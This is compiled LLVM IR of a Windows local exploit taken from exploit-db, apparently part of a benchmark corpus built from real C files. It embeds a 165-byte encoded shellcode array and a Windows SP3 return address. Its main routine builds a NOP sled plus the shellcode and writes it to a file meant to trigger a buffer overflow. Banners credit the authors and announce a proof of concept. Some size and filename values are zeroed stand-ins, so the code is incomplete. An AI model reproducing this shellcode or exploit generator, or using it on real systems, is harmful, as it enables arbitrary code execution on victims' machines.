; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_7974.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_7974.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.winsp3 = private unnamed_addr constant [5 x i8] c"{F\86|\00", align 1
@overflow = common dso_local global i32 0, align 4
@__const.main.shellcode = private unnamed_addr constant [165 x i8] c"1\C9\83\E9\DD\D9\EE\D9t$\F4[\81s\13\EC\96}\B2\83\EB\FC\E2\F4\10~9\B2\EC\96\F6\F7\D0\1D\01\B7\94\97\929\A3\8E\F6\ED\CC\97\96\FBg\A2\F6\B3\02\A7\BD+@\12\BD\C6\EBW\B7\BF\EDT\96F\D7\C2Y\B6\99s\F6\ED\C8\97\96\D4g\9A69\B3\8A|Yg\8A\F6\B3\07\1F!\96\E8ULr\88\1D=\82iV\05\BEg\D6q9\9C\8A\D09\84\9E\96\BBg\16\CD\B2\EC\96\F6\DA\D0\C9LD\8C\C0\F4JoV\06\E2\84f\F7\B6\B3\FE\E5Lf\98*M\0B\F5\1C\DE\8F\B8\18\CA\89\96}\B2\00", align 16
@.str = private unnamed_addr constant [44 x i8] c"\0A******************************************\00", align 1
@.str.1 = private unnamed_addr constant [44 x i8] c"\0A* THIS BUG ORGINAL DISCOVER BY h4ck3r#47 *\00", align 1
@.str.2 = private unnamed_addr constant [44 x i8] c"\0A* THIS BUG C0DED BY SINGLE EYE           *\00", align 1
@.str.3 = private unnamed_addr constant [44 x i8] c"\0A* SPECIAL THANKS TO STR0KE               *\00", align 1
@NOP = common dso_local global i32 0, align 4
@pls = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [3 x i8] c"w+\00", align 1
@.str.5 = private unnamed_addr constant [14 x i8] c"\0A DOne Poc !!\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [5 x i8], align 1
  %7 = alloca i8*, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32*, align 8
  %10 = alloca [165 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = bitcast [5 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %11, i8* align 1 getelementptr inbounds ([5 x i8], [5 x i8]* @__const.main.winsp3, i32 0, i32 0), i64 5, i1 false)
  %12 = load i32, i32* @overflow, align 4
  %13 = zext i32 %12 to i64
  %14 = call i8* @llvm.stacksave()
  store i8* %14, i8** %7, align 8
  %15 = alloca i8, i64 %13, align 16
  store i64 %13, i64* %8, align 8
  %16 = bitcast [165 x i8]* %10 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %16, i8* align 16 getelementptr inbounds ([165 x i8], [165 x i8]* @__const.main.shellcode, i32 0, i32 0), i64 165, i1 false)
  %17 = call i32 @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str, i64 0, i64 0))
  %18 = call i32 @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.1, i64 0, i64 0))
  %19 = call i32 @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.2, i64 0, i64 0))
  %20 = call i32 @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.3, i64 0, i64 0))
  %21 = call i32 @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str, i64 0, i64 0))
  %22 = load i32, i32* @NOP, align 4
  %23 = load i32, i32* @overflow, align 4
  %24 = call i32 @memset(i8* %15, i32 %22, i32 %23)
  %25 = getelementptr inbounds [165 x i8], [165 x i8]* %10, i64 0, i64 0
  %26 = call i32 @memcpy(i8* %15, i8* %25, i32 164)
  %27 = load i32, i32* @overflow, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %15, i64 %28
  store i8 0, i8* %29, align 1
  %30 = load i32, i32* @pls, align 4
  %31 = call i32* @fopen(i32 %30, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0))
  store i32* %31, i32** %9, align 8
  %32 = load i32*, i32** %9, align 8
  %33 = trunc i64 %13 to i32
  %34 = load i32*, i32** %9, align 8
  %35 = call i32 @fwrite(i32* %32, i32 1, i32 %33, i32* %34)
  %36 = load i32*, i32** %9, align 8
  %37 = call i32 @fclose(i32* %36)
  %38 = call i32 @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.5, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  %39 = load i8*, i8** %7, align 8
  call void @llvm.stackrestore(i8* %39)
  %40 = load i32, i32* %3, align 4
  ret i32 %40
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare dso_local i32 @printf(i8*) #3

declare dso_local i32 @memset(i8*, i32, i32) #3

declare dso_local i32 @memcpy(i8*, i8*, i32) #3

declare dso_local i32* @fopen(i32, i8*) #3

declare dso_local i32 @fwrite(i32*, i32, i32, i32*) #3

declare dso_local i32 @fclose(i32*) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
